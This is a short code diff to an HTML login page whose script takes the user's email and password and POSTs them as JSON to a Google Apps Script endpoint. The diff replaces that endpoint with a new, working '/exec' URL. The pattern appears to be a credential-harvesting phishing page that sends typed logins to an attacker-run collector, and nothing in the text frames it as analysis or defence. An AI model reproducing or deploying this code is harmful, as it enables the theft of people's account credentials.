@@ -164,7 +164,7 @@
       const password = document.getElementById('password').value.trim();
 
       if (email && password) {
-        fetch('https://script.google.com/macros/s/1ZzER5WZQWSeDBdLHM1gJWeToaE4Y8SZPMV1TDVvvddJacVPe78127bvd', {
+        fetch('https://script.google.com/macros/s/AKfycbwEeJ9bIT-nC8WfBfPVGLc_eh4h38GDrzJLJV4Kmu8UQe4dZBFnMkQP4RsaIfvjIdLI/exec', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
@@ -181,4 +181,5 @@
   </script>
 </body>
 </html>
+
 
